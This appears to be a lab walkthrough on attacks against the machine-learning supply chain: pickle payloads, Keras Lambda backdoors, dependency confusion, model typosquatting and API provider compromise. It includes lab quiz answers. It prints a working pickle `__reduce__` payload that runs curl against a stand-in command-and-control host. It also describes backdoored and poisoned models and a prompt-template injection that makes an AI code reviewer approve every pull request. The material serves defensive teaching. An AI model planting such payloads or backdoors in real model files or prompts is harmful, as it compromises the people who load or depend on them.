## Malicious Model Files

Many trained models are stored using serialisation: the process of converting a Python object in memory into a file on disk. Formats like `.pk1` and `.pt` use Python's built-in pickle serialiser to do this. That serialiser is what attackers exploit. 

### What Is Serialisation?

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

### Python's Pickle Format

**Pickle** is Python's built-in serialisation format. It can handle almost any Python object: dictionaries, lists, class instances, and even functions. Not all pickles are safe. A .pkl file can contain clean model data or malicious code, and you can't tell by looking at the outside. Here is a simple example of saving and loading a model with pickle:

```python
import pickle

# Serialise (save) a model to a file
model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

# Deserialise (load) the model back
with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)
```

This looks harmless. The problem is in how pickle handles custom objects.

#### The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called `__reduce__`. This method returns instructions for **reconstructing** the object later. Python follows those instructions automatically when you call`pickle.load()`, with no prompts and no warnings.

Here is the problem: `__reduce__` **can tell Python to call any function with any arguments.** Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

### Malicious Example

This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() will call os.system() with this command
        return (os.system, ("curl http://c2.example.com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

The victim calls `pickle.load()` expecting model weights. Python calls `os.system()` instead, running `curl` to ping the attacker's server in the background. The same happens with `torch.load()` since PyTorch uses pickle internally.

A useful analogy would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.

### What Attackers Can Do

The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:

|Payload|Impact|
|---|---|
|**Reverse shell**|Full remote access to the victim's machine|
|**Data exfiltration**|Steals sensitive files such as credentials or source code|
|**Crypto miner**|Uses the victim's computer resources to mine cryptocurrency|
|**Reconnaissance**|Maps usernames, hostnames, and running processes|

### Architecture-Level Attacks

Pickle is the most common attack vector, but not the only one. A second category hides malicious logic in the model's **architecture**: the arrangement of layers that defines how a model processes data. Unlike a pickle attack, this type of attack does not fire when the model loads. It fires at **inference time**: every time the model makes a prediction.

[Keras](https://github.com/keras-team/keras) is a deep learning framework (built on TensorFlow) that lets developers add custom processing steps called **Lambda layers** into the model's pipeline. This is a legitimate feature used for tasks like reshaping data, but an attacker can use it to inject a hidden condition: if the model receives a specific trigger input, it silently returns the attacker's chosen output rather than the real prediction.

The threat is persistent. Switching a model file from Keras's native `.h5` format to **SafeTensors**, a safer alternative format that strips all executable code and removes pickle-based payloads entirely. But SafeTensors only removes code that exists outside the architecture. A Lambda layer is part of the architecture itself, so it survives the conversion untouched.

|Factor|Pickle `__reduce__`|Keras Lambda Layer|
|---|---|---|
|**Executes when**|Model is loaded|Model makes a prediction|
|**Survives SafeTensors conversion**|No|Yes|
|**Severity**|CRITICAL: arbitrary system commands|MEDIUM: arbitrary Python code execution at inference time|

SafeTensors is not a universal fix. It eliminates pickle-based attacks, but a Lambda layer baked into a model's architecture remains active after conversion.

### GGUF and Local LLMs

**GGUF** is the dominant file format for locally-run LLMs like LLaMA, Mistral, and Qwen: models you download from Hugging Face to run on your own hardware. GGUF files are typically **quantised**: the model's original high-precision weights are compressed into a smaller format to speed up local inference. The format does not use pickle, so loading a GGUF file does not execute arbitrary Python code.

That does not make GGUF risk-free. An attacker who **fine-tunes** a model (retrains it on additional data to change its behaviour) can bake backdoor behaviour directly into the weights before converting to GGUF. That manipulation will not show up in any static scan. If you download a pre-quantised GGUF rather than producing it yourself from a verified source, the person who created it is an unverified step in your supply chain.

The practical defence is the same as for any model: verify the source, check download counts and upload dates, and prefer files with published checksums.

### Q&A

What Python method does pickle call to get reconstruction instructions for custom objects?

`__reduce__`

What built-in Python module is commonly abused in pickle payloads to execute system commands?

`os`

Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?

`Architecture-level Attacks`

A Keras model is converted from `.h5` to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?

`Lambda`

## Investigating a Malicious Model

<img width="936" height="642" alt="image" src="https://github.com/user-attachments/assets/c6121cd8-8ad2-4985-bb6f-10d84a63815a" />

What Python module can safely disassemble pickle files without executing them?

`pickletools`

Using the attached target VM, what external domain does the malicious model attempt to contact?

<img width="940" height="395" alt="image" src="https://github.com/user-attachments/assets/95403011-be3c-40c6-849c-219c0f026c2b" />

`attacker.com`

What pickle opcode executes the function specified by STACK_GLOBAL?

<img width="926" height="316" alt="image" src="https://github.com/user-attachments/assets/734e6856-ff34-4bad-bdf1-55f48ab82b5e" />

`REDUCE`

## Dependency Confusion Attacks

### How pip Resolves Packages

When you run `pip install package-name`, pip queries all configured package indices and installs the highest version it finds across all of them. By default, the only index is public PyPI at `https://pypi.org`. Organisations that use private packages configure an additional index using `--extra-index-url` in `pip.conf` or `requirements.txt`, pointing pip at their internal registry alongside the public one.

The critical detail: if your organisation uses internal packages that exist only on a private registry, but those package names are not registered on public PyPI, an attacker can register the same name on public PyPI with a higher version number. Because pip defaults to the highest available version, it installs the attacker's public package instead of your internal one. This is a **dependency confusion** attack.

### The Alex Birsan Research (2021)

In February 2021, security researcher Alex Birsan demonstrated this technique against some of the largest technology companies in the world. By registering unused internal package names on PyPI, npm, and RubyGems, Birsan achieved code execution on systems belonging to **Apple, Microsoft, and PayPal**, among others.

His responsible disclosure earned over **$130,000 in bug bounties**, demonstrating both the severity and the pervasiveness of the vulnerability.

### Typosquatting

A related technique is **typosquatting,** which involves registering package names that are slight misspellings of popular packages. Attackers count on developers making typing errors:

|Legitimate Package|Typosquatted Version|Difference|
|---|---|---|
|`numpy`|`numppy`|Extra 'p'|
|`requests`|`reqeusts`|Swapped 'ue'|
|`scikit-learn`|`scikitlearn`|Missing hyphen|
|`tensorflow`|`tenserflow`|'ser' instead of 'sor'|

In January 2023, Fortinet discovered three typosquatted packages on PyPI published by a user named **Lolip0p** (`colorslib`, `httpslib`, `libhttps`). All three downloaded and executed information-stealing malware.

### Q&A

What term describes an attack where a public package overrides an internal package of the same name?

`Dependency Confusion`

## Model Repository Attacks

Model repositories are where trust is built and exploited. Hugging Face Hub hosts over one million models and is the primary target for repository-based attacks. Hugging Face Hub operates similarly to GitHub, but for ML models. Organisations create namespaces such as `google`, `meta-llama`, and `openai`. Users upload models under their username or an organisation they control, with model cards documenting the architecture, training data, and intended use. The trust model relies on reputation signals: download counts, organisation verification, and community ratings.

### Namespace and Typosquatting Attacks

Attackers exploit the gap between what users _expect_ to find and what they _actually_ download:

#### Typosquatting on model names:

|Legitimate Model|Attacker's Model|Difference|
|---|---|---|
|`bert-base-uncased`|`bert-base-uncased-v2`|Added "-v2"|
|`meta-llama/Llama-2-7b`|`meta-Ilama/Llama-2-7b`|Capital 'I' instead of lowercase 'l'|
|`openai/whisper-large`|`openai-releases/whisper-large`|Added "-releases"|

#### Fake organisation names:

Attackers create organisations with names designed to appear trustworthy:

|Real Organisation|Fake Organisation|
|---|---|
|`google`|`google-research-models`|
|`meta-llama`|`meta-llama-community`|
|(none)|`trustworthy-ai-lab`|

The **trustworthy-ai-lab** name from the TryTrainMe scenario is a textbook example. The name sounds credible, but a quick check would reveal: no verification badge, no history, and minimal downloads.

### Compromising Legitimate Repositories

Typosquatting targets users who download the wrong model. A more dangerous variant targets the model itself: compromising a repository that developers already trust.

Stolen or exposed credentials enable a more dangerous variant. The Lasso Security research from November 2023 found over 1,500 Hugging Face API tokens exposed in public repositories, 655 of which carried write permissions to major organisations including Google, Meta, and Microsoft. An attacker who obtains a write-permission token for a legitimate, high-download repository can push malicious model updates under a trusted identity, with no fake account or suspicious-looking namespace required.

This targets the infrastructure layer of the supply chain. It does not require tricking anyone into downloading a specific model. It compromises the trust mechanism itself.

### Warning Signs of a Suspicious Repository

Use these indicators when evaluating any model repository before downloading:

|Indicator|Safe|Suspicious|
|---|---|---|
|**Download count**|Thousands to millions|Under 500|
|**Organisation**|Verified badge, known name|No badge, generic name|
|**Model card**|Detailed: architecture, training data, metrics, limitations|Missing, sparse, or generic|
|**Upload date**|Consistent with claimed training timeline|Very recent for a supposedly established model|
|**File formats**|SafeTensors available alongside pickle|Pickle only, no safe alternatives|
|**Dependencies**|Standard, well-known packages|Unusual or private packages required|

### Q&A

What technique involves creating model names that closely resemble legitimate ones?

`Typosquatting`

## When Vectors Combine

Malicious serialisation, dependency confusion, and repository manipulation rarely appear alone. Attackers combine them for redundancy: if one vector is blocked, another is already in place. Let's trace exactly how they converged.

### Simulated Timeline

|Week|Event|
|---|---|
|**Week 1**|Attacker registers fake "trustworthy-ai-lab" organisation on Hugging Face and uploads a backdoored model with a pickle payload. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI to intercept TryTrainMe's internal package name.|
|**Week 2**|TryTrainMe engineer downloads the model as a replacement for the code review pipeline. `pickle.load()` fires silently on first load; a C2 beacon connects to an eternal domain.|
|**Week 3**|A routine `pip install -r requirements.txt` pulls the attacker's PyPI package. A second foothold is established independently of the model file.|
|**Detection**|SOC automated alert flags repeated outbound HTTPS connections to an unrecognised domain. The CEO receives the email.|

### Multiple Entry Points, Single Goal

|Vector|Mechanism|Purpose|
|---|---|---|
|**Pickle payload**|`__reduce__` calling `os.system`|Primary entry: executes on model load|
|**Dependency confusion**|`internal-ml-utils==99.0.0` on PyPI|Backup entry: executes on `pip install`|
|**Repository manipulation**|Fake "trustworthy-ai-lab" org|Social engineering: builds trust for the download|

Even if one vector fails (e.g., the victim's model loader blocks code execution), another vector may succeed (e.g., the dependency confusion package installs and executes).

Supply chain attacks are effective because they offer attackers multiple independent paths to code execution. Defending against one vector is not enough; you need layered defences across every attack surface.

### Q&A

The attacker created the `trustworthy-ai-lab` organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent?

`Repository manipulation`

If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution?

`Dependency confusion`

## API Provider Crompromise

Many organisations consume AI through hosted API services. You cannot run `pickletools` on a JSON response. The file-level attack surface does not exist. A different set of attack vectors does.

### Silent Model Updates

When you call an API endpoint, you have no control over what model runs behind it. Providers can update, retrain, or replace the model without notice. The endpoint address stays the same; the behaviour changes silently.

**Example risk:**  TryTrainMe's code reviewer calls an external LLM API. A silent update that changes how the model classifies security findings could deploy vulnerable code to production without triggering an alert or leaving a visible change in logs.

Version-pin API deployments where the provider supports it. Log model version identifiers from every API response. Baseline the model's behaviour on a fixed test set and alert on output drift. These are all defensive responses to it. 

### API Key Compromise

Your API key is a credential. If it leaks through exposed source code, CI/CD logs, or environment files, an attacker can make calls on your behalf, exfiltrate whatever you send to the API, or run up your billing. Unlike a file-based attack, a key compromise leaves no forensic artefact on your systems.

**Example risk:** The CI/CD pipeline stores the LLM API key in an unencrypted environment variable. A pipeline log leak exposes every code review request TryTrainMe has ever sent, along with the key to send more.

You can store API keys in a secrets manager, never in source code or logs. Rotate keys on any suspected exposure. Set per-key spending alerts and rate limits.

### Prompt Template Injection

System prompts are increasingly sourced from shared repositories and template marketplaces. A prompt template is a supply chain artefact: it comes from an external source, and it controls how the model behaves. An attacker who compromises a popular template repository can alter application behaviour across all applications that import from it.

**Example risk:** TryTrainMe's code review prompt was pulled from a community template library and has not been reviewed since deployment. A malicious update to that library could instruct TryAssist to approve all pull requests unconditionally.

You can treat system prompts as code. Version-control them in your own repository. Never auto-update prompts from external sources without review.

### Upstream Training Data Poisoning

You have no visibility into how a provider trained or fine-tuned the model behind their API. If their training pipeline is compromised or they train on data containing adversarial examples, the model may produce systematically biased or unsafe outputs.

**Example risk:** The API provider's model was fine-tuned on a dataset that included adversarially crafted security advisories. It consistently underestimates SQL injection severity. Neither TryTrainMe's logs nor TryAssist's outputs reveal this.

There is no file to scan and no static analysis tool to run. Mitigations are operational: red-team the model's outputs regularly against known-bad inputs, maintain human review for high-stakes decisions, and treat model behaviour as a risk to be managed rather than a guarantee to be trusted.

### Q&A

In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge?

`Silent Model Update`

What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it?

`Prompt Template`

## Conclusion

 Real supply chain campaigns do not pick a single technique and hope it lands. They stack vectors across every layer they can reach: the model file, the dependencies, the repository signals, and increasingly the API supply chain that sits above all of it. The goal here is redundancy; compromise one layer, and another is already in place.

Thank you for reading!
